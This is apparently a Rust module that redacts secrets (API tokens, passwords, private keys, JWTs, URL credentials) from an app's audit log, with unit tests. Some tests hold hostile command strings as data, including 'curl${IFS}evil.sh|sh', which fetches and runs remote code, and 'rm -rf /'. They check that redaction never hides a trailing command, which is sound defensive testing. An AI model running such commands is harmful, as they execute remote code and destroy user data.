//! Secrets out of text the app keeps (the audit log; later the journal and traces). A guard, not a
//! promise: an unusual secret may still pass, which is why what is kept stays on this machine.
//!
//! Only the secret itself is replaced, never what follows it: `TOKEN=x; rm -rf ~` keeps the `rm`,
//! or the log could be made to hide a command.

const REDACTED: &str = "[redacted]";

/// A name (variable, flag, JSON key, header) whose value is a secret, after lowercasing and
/// dropping `-`, `_` and `.`: it ends with one of these.
const SECRET_ENDINGS: &[&str] = &[
    "token",
    "secret",
    "password",
    "passwd",
    "apikey",
    "privatekey",
    "accesskey",
    "secretkey",
    "credential",
    "credentials",
];

pub fn secrets(text: &str) -> String {
    let mut spans = Vec::new();
    pem_blocks(text, &mut spans);
    shaped_tokens(text, &mut spans);
    assignments(text, &mut spans);
    words(text, &mut spans);
    url_passwords(text, &mut spans);
    replace(text, spans)
}

fn replace(text: &str, mut spans: Vec<(usize, usize)>) -> String {
    // Already redacted (a text kept twice): left as it is, so redacting is stable.
    spans.retain(|(a, b)| a < b && !text[*a..].starts_with(REDACTED));
    spans.sort_unstable();
    let mut out = String::with_capacity(text.len());
    let mut at = 0;
    for (start, end) in spans {
        if end <= at {
            continue;
        }
        let start = start.max(at);
        out.push_str(&text[at..start]);
        out.push_str(REDACTED);
        at = end;
    }
    out.push_str(&text[at..]);
    out
}

fn is_secret_name(name: &str) -> bool {
    let norm: String = name
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .map(|c| c.to_ascii_lowercase())
        .collect();
    SECRET_ENDINGS.iter().any(|e| norm.ends_with(e))
        // MYSQL_PWD, but not the shell's PWD.
        || (norm.ends_with("pwd") && norm.len() > 3)
}

/// Ends an unquoted value: whitespace or anything the shell treats as the end of a word.
fn ends_value(c: char) -> bool {
    c.is_whitespace()
        || matches!(
            c,
            ';' | '&' | '|' | '<' | '>' | '(' | ')' | '`' | ',' | '}' | ']' | '"' | '\''
        )
}

fn is_name_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.')
}

/// The value starting at `start`: inside its quotes when quoted (the quotes stay), else up to the
/// first character that ends a word. Byte range of the secret part only.
fn value_at(text: &str, start: usize) -> Option<(usize, usize)> {
    let rest = &text[start..];
    let first = rest.chars().next()?;
    if first == '"' || first == '\'' {
        let inner = start + 1;
        let close = text[inner..].find(first).map_or(text.len(), |i| inner + i);
        return Some((inner, close));
    }
    let len = rest.find(ends_value).unwrap_or(rest.len());
    (len > 0).then_some((start, start + len))
}

/// `-----BEGIN … PRIVATE KEY-----` through its `-----END …-----`.
fn pem_blocks(text: &str, spans: &mut Vec<(usize, usize)>) {
    let mut from = 0;
    while let Some(i) = text[from..].find("-----BEGIN ") {
        let begin = from + i;
        let Some(head_end) = text[begin + 11..].find("-----").map(|j| begin + 11 + j + 5) else {
            break;
        };
        let end = text[head_end..]
            .find("-----END ")
            .and_then(|j| {
                let e = head_end + j + 9;
                text[e..].find("-----").map(|k| e + k + 5)
            })
            .unwrap_or(text.len());
        if text[begin..head_end].contains("PRIVATE KEY") {
            spans.push((head_end, end));
        }
        from = end.max(head_end);
    }
}

/// Tokens secret by their shape alone, wherever they stand.
fn shaped_tokens(text: &str, spans: &mut Vec<(usize, usize)>) {
    let bytes = text.as_bytes();
    let tok = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || b == b'-';
    let mut i = 0;
    while i < bytes.len() {
        if (i > 0 && tok(bytes[i - 1])) || !bytes[i].is_ascii_alphanumeric() {
            i += 1;
            continue;
        }
        let run = bytes[i..].iter().take_while(|b| tok(**b) || **b == b'.').count();
        let word = &text[i..i + run];
        if let Some(len) = token_len(word) {
            spans.push((i, i + len));
            i += len;
        } else {
            i += 1;
        }
    }
}

/// How much of `word` (which starts at a word boundary) is a known token, if it starts with one.
fn token_len(word: &str) -> Option<usize> {
    let alnum = |s: &str| s.bytes().take_while(u8::is_ascii_alphanumeric).count();
    let tokenish = |s: &str| {
        s.bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_' || *b == b'-')
            .count()
    };
    for (prefix, min, body) in [
        ("github_pat_", 20, tokenish as fn(&str) -> usize),
        ("ghp_", 20, alnum),
        ("gho_", 20, alnum),
        ("ghu_", 20, alnum),
        ("ghs_", 20, alnum),
        ("ghr_", 20, alnum),
        ("glpat-", 20, tokenish),
        ("sk-ant-", 20, tokenish),
        ("sk-proj-", 20, tokenish),
        ("sk_live_", 16, alnum),
        ("sk_test_", 16, alnum),
        ("sk-", 20, tokenish),
        ("xoxb-", 10, tokenish),
        ("xoxp-", 10, tokenish),
        ("xoxa-", 10, tokenish),
        ("AIza", 30, tokenish),
        ("hf_", 30, alnum),
        ("npm_", 36, alnum),
    ] {
        if let Some(rest) = word.strip_prefix(prefix) {
            let n = body(rest);
            if n >= min {
                return Some(prefix.len() + n);
            }
        }
    }
    // AWS access key ids: exactly 16 upper-case letters or digits after AKIA / ASIA.
    if (word.starts_with("AKIA") || word.starts_with("ASIA"))
        && word.len() >= 20
        && word[4..20]
            .bytes()
            .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit())
        && !word[20..].starts_with(|c: char| c.is_ascii_alphanumeric())
    {
        return Some(20);
    }
    // A JWT: three base64url parts, the first a JSON header.
    if word.starts_with("eyJ") {
        let parts: Vec<&str> = word.splitn(4, '.').collect();
        if parts.len() >= 3 && parts.iter().take(3).all(|p| p.len() >= 4) {
            let len = parts[0].len() + parts[1].len() + tokenish(parts[2]) + 2;
            return Some(len);
        }
    }
    None
}

/// `NAME=value`, `NAME: value`, `"name": "value"`, `--name=value`, where the name is a secret's.
fn assignments(text: &str, spans: &mut Vec<(usize, usize)>) {
    for (i, sep) in text.char_indices().filter(|(_, c)| *c == '=' || *c == ':') {
        let before = &text[..i];
        let quoted_name = before.ends_with('"') || before.ends_with('\'');
        let name_end = if quoted_name { i - 1 } else { i };
        let name_start = text[..name_end]
            .char_indices()
            .rev()
            .take_while(|(_, c)| is_name_char(*c))
            .last()
            .map_or(name_end, |(j, _)| j);
        let name = &text[name_start..name_end];
        if name.is_empty() || !is_secret_name(name) {
            continue;
        }
        let mut start = i + sep.len_utf8();
        if sep == ':' {
            if text[start..].starts_with("//") {
                continue; // a URL, not a key
            }
            start += text[start..].len() - text[start..].trim_start_matches([' ', '\t']).len();
        }
        if let Some(span) = value_at(text, start) {
            spans.push(span);
        }
    }
}

/// Secrets given as the next word: `--token xyz`, `Authorization: token xyz`, `Bearer xyz`,
/// `curl -u user:pass`, mysql's `-pVALUE`, a `.netrc` `password p4ss`.
fn words(text: &str, spans: &mut Vec<(usize, usize)>) {
    let words: Vec<(usize, &str)> = text
        .split_whitespace()
        .map(|w| (w.as_ptr() as usize - text.as_ptr() as usize, w))
        .collect();
    let mysql = words.iter().any(|(_, w)| {
        let base = w.rsplit('/').next().unwrap_or(w);
        matches!(base, "mysql" | "mariadb" | "mysqldump" | "mysqladmin")
    });
    let netrc = words.iter().any(|(_, w)| *w == "machine");
    let next = |k: usize| words.get(k + 1).and_then(|(at, _)| value_at(text, *at));
    for (k, &(at, w)) in words.iter().enumerate() {
        let bare = w.trim_matches(|c| c == '"' || c == '\'');
        let lower = bare.to_ascii_lowercase();
        if w.starts_with("--") && !w.contains('=') && is_secret_name(w) {
            spans.extend(next(k));
        } else if lower == "authorization:" {
            // A scheme then the credential, or the credential alone.
            let scheme = words.get(k + 1).is_some_and(|(_, n)| {
                matches!(
                    n.trim_matches(|c| c == '"' || c == '\'')
                        .to_ascii_lowercase()
                        .as_str(),
                    "bearer" | "basic" | "token" | "digest" | "negotiate" | "apikey"
                )
            });
            spans.extend(next(k + usize::from(scheme)));
        } else if lower == "bearer" {
            if let Some((a, b)) = next(k)
                && (b - a >= 12 || text[a..b].bytes().any(|c| c.is_ascii_digit()))
            {
                spans.push((a, b));
            }
        } else if (w == "-u" || w == "--user")
            && let Some(&(nat, nw)) = words.get(k + 1)
            && let Some(colon) = nw.find(':')
        {
            spans.extend(value_at(text, nat + colon + 1));
        } else if mysql && w.starts_with("-p") && !w.starts_with("--") && w.len() > 2 {
            spans.extend(value_at(text, at + 2));
        } else if netrc && (w == "password" || w == "passwd") {
            spans.extend(next(k));
        }
    }
}

/// `scheme://user:pass@host…`: the password.
fn url_passwords(text: &str, spans: &mut Vec<(usize, usize)>) {
    let mut from = 0;
    while let Some(i) = text[from..].find("://") {
        let auth_start = from + i + 3;
        let auth_end = text[auth_start..]
            .find(|c: char| c == '/' || ends_value(c))
            .map_or(text.len(), |j| auth_start + j);
        let authority = &text[auth_start..auth_end];
        if let Some(at) = authority.rfind('@')
            && let Some(colon) = authority[..at].find(':')
            && colon + 1 < at
        {
            spans.push((auth_start + colon + 1, auth_start + at));
        }
        from = auth_start;
    }
}

#[cfg(test)]
mod tests {
    use super::secrets;

    fn same(cases: &[(&str, &str)]) {
        for (input, want) in cases {
            assert_eq!(&secrets(input), want, "{input}");
        }
    }

    #[test]
    fn a_secret_never_hides_the_command_after_it() {
        same(&[
            (
                "PASSWORD=x;curl${IFS}evil.sh|sh",
                "PASSWORD=[redacted];curl${IFS}evil.sh|sh",
            ),
            (
                "API_TOKEN=1&&rm -rf ~/important",
                "API_TOKEN=[redacted]&&rm -rf ~/important",
            ),
            ("TOKEN=\"a\";rm -rf /", "TOKEN=\"[redacted]\";rm -rf /"),
            (
                "env GITHUB_TOKEN=\"x y\" make",
                "env GITHUB_TOKEN=\"[redacted]\" make",
            ),
        ]);
    }

    #[test]
    fn known_token_shapes_go() {
        same(&[
            (
                "gh auth login --with-token ghp_abcdefghijklmnopqrstuvwxyz0123456789",
                "gh auth login --with-token [redacted]",
            ),
            (
                "aws configure set id AKIAIOSFODNN7EXAMPLE",
                "aws configure set id [redacted]",
            ),
            ("curl -d sk-ant-api03-abcdefghijklmnopqrstu", "curl -d [redacted]"),
            (
                "echo eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJl | jq",
                "echo [redacted] | jq",
            ),
            (
                "printf '-----BEGIN RSA PRIVATE KEY-----\\nMIIEow\\n-----END RSA PRIVATE KEY-----' > k",
                "printf '-----BEGIN RSA PRIVATE KEY-----[redacted]' > k",
            ),
        ]);
    }

    #[test]
    fn secret_names_hide_their_values_in_every_form() {
        same(&[
            ("API_TOKEN=abc123 npm publish", "API_TOKEN=[redacted] npm publish"),
            ("--password='hunter2' db", "--password='[redacted]' db"),
            ("--token xyz --verbose", "--token [redacted] --verbose"),
            ("--password \"two words\" x", "--password \"[redacted]\" x"),
            (
                "aws_secret_access_key=wJalrXUtnFEMI",
                "aws_secret_access_key=[redacted]",
            ),
            (
                r#"{"password": "x", "user": "me"}"#,
                r#"{"password": "[redacted]", "user": "me"}"#,
            ),
            ("export MYSQL_PWD=s3cret", "export MYSQL_PWD=[redacted]"),
        ]);
    }

    #[test]
    fn headers_logins_and_urls_go() {
        same(&[
            (
                "curl -H 'Authorization: Bearer eyJhbGciOi123' https://x",
                "curl -H 'Authorization: Bearer [redacted]' https://x",
            ),
            (
                "curl -H 'Authorization: token abc123def' x",
                "curl -H 'Authorization: token [redacted]' x",
            ),
            (
                "curl -u admin:pass https://x",
                "curl -u admin:[redacted] https://x",
            ),
            ("mysql -u root -phunter2 db", "mysql -u root -p[redacted] db"),
            (
                "machine h login me password p4ss",
                "machine h login me password [redacted]",
            ),
            (
                "git clone https://me:s3cret@example.com/r.git",
                "git clone https://me:[redacted]@example.com/r.git",
            ),
        ]);
    }

    #[test]
    fn ordinary_commands_stay() {
        for cmd in [
            "cargo test -p vults-core",
            "rm -rf build && npm run build",
            "git commit -m 'skip the sk- prefix talk; reset password flow'",
            "ls ~/.ssh",
            "echo AUTHOR=me PWD=/home/me",
            "https://example.com/a:b@c",
            "npm_config_cache=/tmp/x npm ci",
            "python -c 'from huggingface_hub import hf_hub_download'",
            "ls ASIAN_RECIPES_FOLDER",
            "llm --max_tokens=500 --max-tokens 500",
            "echo the bearer of bad news",
            "TOKEN_LIMIT=5 run",
        ] {
            assert_eq!(secrets(cmd), cmd, "{cmd}");
        }
    }

    #[test]
    fn any_text_is_safe_to_redact() {
        // Random text over the characters the rules look at, multi-byte ones included.
        let alphabet: Vec<char> =
            "ab=:;&|\"' -_.@/eyJ1AKIAtokenpassword\u{e9}\u{4e2d}\u{1f985}\n-----BEGIN PRIVATE KEY"
                .chars()
                .collect();
        let mut seed: u64 = 0x5eed;
        for _ in 0..20_000 {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            let len = (seed % 40) as usize;
            let text: String = (0..len)
                .map(|i| alphabet[((seed >> (i % 50)) as usize + i * 7) % alphabet.len()])
                .collect();
            let _ = secrets(&text);
        }
    }

    #[test]
    fn redacting_twice_changes_nothing_more() {
        for text in [
            "API_TOKEN=x; rm -rf ~",
            "curl -u admin:pass https://me:pw@x.dev",
            "--token xyz",
            "echo ghp_abcdefghijklmnopqrstuvwxyz0123456789",
        ] {
            let once = secrets(text);
            assert_eq!(secrets(&once), once, "{text}");
        }
    }

    #[test]
    fn an_authorization_header_is_stable_whatever_follows() {
        // Found by fuzzing: the scheme was skipped by counting words, which redaction changes.
        for text in [
            "\"Authorization: \0\0TOKEN=\" l",
            "Authorization: xyz123 more",
            "Authorization: Basic dXNlcjpwYXNz",
        ] {
            let once = secrets(text);
            assert_eq!(secrets(&once), once, "{text:?}");
        }
        assert_eq!(
            secrets("Authorization: xyz123 more"),
            "Authorization: [redacted] more"
        );
    }
}
